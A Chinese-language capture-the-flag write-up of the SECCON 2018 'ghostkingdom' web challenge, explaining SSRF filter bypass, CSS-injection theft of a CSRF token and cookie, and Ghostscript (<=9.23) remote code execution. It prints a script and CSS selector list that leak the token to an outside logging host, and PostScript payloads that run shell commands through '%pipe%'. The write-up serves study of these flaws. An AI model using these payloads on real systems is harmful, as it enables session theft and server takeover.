---
title: 2018SECCON ghostkingdom
date: 2018-10-29 18:25:00
tags:
	- writeup
---

# 前言

唯一的一道web题，周末有事去啦就没做上，赛后复盘了一下。

有两个之前没学过的知识点，`CSS injection`和`Ghost命令执行`（暑假出来的时候太懒就没复现T_T

这篇writeup想以另外一种形式来写，会更注重下这两个漏洞的原理和利用。

# ghostkingdom

## 主要功能

题目开始是个简单的注册登录，登录的时候仔细观察可以发现登录的账号密码是通过GET方式传输的（稍后会有用

进去之后有三个主要的功能点

![](2018SECCON-ghostkingdom\1.jpg)

- 给管理员发送消息（测试xss似乎不管用
- 截屏
- 上传图像（只有本地登录的用户才可以开启这个功能

一番测试之后，可以发现发送消息的url有一些端倪

```
http://ghostkingdom.pwn.seccon.jp/?css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&msg=hello&action=msgadm2
```

明显可以看出是一段base64的编码，试图去修改之后进行xss

![](2018SECCON-ghostkingdom\2.jpg)

很不幸的是尖括号之类的字符被实体转义了。随后就想到一个从未用过但是之前在书上一老看到的利用CSS进行XSS

但是吧，学安全这玩意不动手确实是不行，试了半天在本地也没成功过，最后看了owasp中的一段话真相了

![](2018SECCON-ghostkingdom\3.jpg)

IE 7/8。。那不约等于没有这种漏洞利用手法。

## CSS injection

然后就是涉及到`CSS`的另外一种利用手法，利用`url（）`可以发送请求，来获取前端页面中的数据。

这里还需要关注到另外一个点就是`csrf_token`中的值和`Cookie`中的值是一致的。

也就意味着我们可以利用`CSS`来获取`Cookie`的值。

`screenshot`的界面有个比较明显的`SSRF`，虽然限制了一些关键字，但是还是可以用`0.0.0.0`或者十进制之类的方式绕过。

这里有个点一直没怎么搞懂，就是需要自己先通过截屏的功能登录一次，让对方服务器先带上cookie（比赛的时候那么多人，而且那么多服务器，不会出问题么?

只要通过如下的方式，就可以让对方服务器带上Cookie了。

```
http://0.0.0.0/?user=username&pass=password&action=login
```

然后就是通过构造包含恶意CSS的页面，来获取在`csrf_token`上的cookie值

```python
import base64
def getBase64(s):
    z = []
    for i  in  '0123456789abcdef':
        st = s + i
        z.append('input[value^="{}"] {{background: url(http://kingkk.com:23333?csrf={})}}'.format(st, st))
    return base64.b64encode('\n'.join(z))

def formatURL(s):
    return "http://0.0.0.0/?css={}&action=msgadm2".format(s)

print formatURL(getBase64('8dc4811759c90887a1f2d6'))
```

需要22次，就能依次爆出cookie的值

![](2018SECCON-ghostkingdom\5.jpg)

## Ghostscript rce

利用这个cookie登录之后就能访问上传图片的功能。

上传图片后还能进行`jpg`转`gif`的格式转换。

当上传一个不符合要求的图片的时候，会爆出一些错误

![](2018SECCON-ghostkingdom\6.jpg)

可以看到`convert`命令的错误信息。就会涉及到八月份底爆出的`Ghostscript`命令执行的漏洞

这里只要构造好对应的图片，就能进行任意代码执行，读取flag。（文件路径有相应的提示，就不多说

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%$(cat /var/www/html/FLAG/FLAGflagF1A8.txt)) currentdevice putdeviceprops
```

![](2018SECCON-ghostkingdom\7.jpg)



# CSS injection

当我们只能够控制`<style>`标签中的内容，无法进行标签逃逸时，可以通过一些特定的方式来获取页面中的数据。

比如`csrf_token`获取后台页面中的一些数据。

主要原理是通过css样式支持的一些匹配，以及`url`可以发起一次GET请求来进行攻击。

就像CTF题中的，想要获取`csrf_token`的值，就可以利用`input[name="scrf"]`来选中这个标签

![](2018SECCON-ghostkingdom\8.jpg)

然后再利用正则匹配

```css
input[name="scrf"][value^="0"] {background: url(http://kingkk.com:23333?csrf=0)}
input[name="scrf"][value^="1"] {background: url(http://kingkk.com:23333?csrf=1)}
input[name="scrf"][value^="2"] {background: url(http://kingkk.com:23333?csrf=2)}
input[name="scrf"][value^="3"] {background: url(http://kingkk.com:23333?csrf=3)}
input[name="scrf"][value^="4"] {background: url(http://kingkk.com:23333?csrf=4)}
input[name="scrf"][value^="5"] {background: url(http://kingkk.com:23333?csrf=5)}
input[name="scrf"][value^="6"] {background: url(http://kingkk.com:23333?csrf=6)}
input[name="scrf"][value^="7"] {background: url(http://kingkk.com:23333?csrf=7)}
input[name="scrf"][value^="8"] {background: url(http://kingkk.com:23333?csrf=8)}
input[name="scrf"][value^="9"] {background: url(http://kingkk.com:23333?csrf=9)}
input[name="scrf"][value^="a"] {background: url(http://kingkk.com:23333?csrf=a)}
input[name="scrf"][value^="b"] {background: url(http://kingkk.com:23333?csrf=b)}
input[name="scrf"][value^="c"] {background: url(http://kingkk.com:23333?csrf=c)}
input[name="scrf"][value^="d"] {background: url(http://kingkk.com:23333?csrf=d)}
input[name="scrf"][value^="e"] {background: url(http://kingkk.com:23333?csrf=e)}
input[name="scrf"][value^="f"] {background: url(http://kingkk.com:23333?csrf=f)}
```

当匹配到页面中value值为某一个特定的值时，就设置不同的**背景**（目的是为了利用`url`发送一次GET请求

GET的请求可以被访问日志给记录。这样，就可以利用这种匹配的手段，来获取页面中的一些值。从而窃取数据。



# Ghostscript rce

今年暑假新出的漏洞，当时以为是一门小众的编程语言，就没在意了。原来是用来处理图片的。

`ghostscript`用于处理图片，被内置在一些库中。网站中处理图片的功能还是比较常见的，听说当时好多人刷了一大波src

- imagemagick
- libmagick
- graphicsmagick
- gimp
- python-matplotlib
- texlive-core
- texmacs
- latex2html
- latex2rtf

由于C太菜，就不分析内部逻辑了，直接来看下利用。

需要ghostscript <= 9.23

然后只需要构造一个特定的图片，就可以任意代码执行。

Ubuntu

```gs
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

将id替换成别的语句就可以执行任意代码

```
(%pipe%$(cat /var/www/html/FLAG/FLAGflagF1A8.txt))
```

![](2018SECCON-ghostkingdom\9.jpg)

Centos中代码有些细微的差别

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

由于暂时没有centos虚拟机，就没验证了。

在平时渗透测试中，可以测试一些带有dnslog的poc，来测试是否存在该漏洞。


# Reference

https://xz.aliyun.com/t/3075

http://uuzdaisuki.com/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/

https://bbs.ichunqiu.com/article-1705-1.html

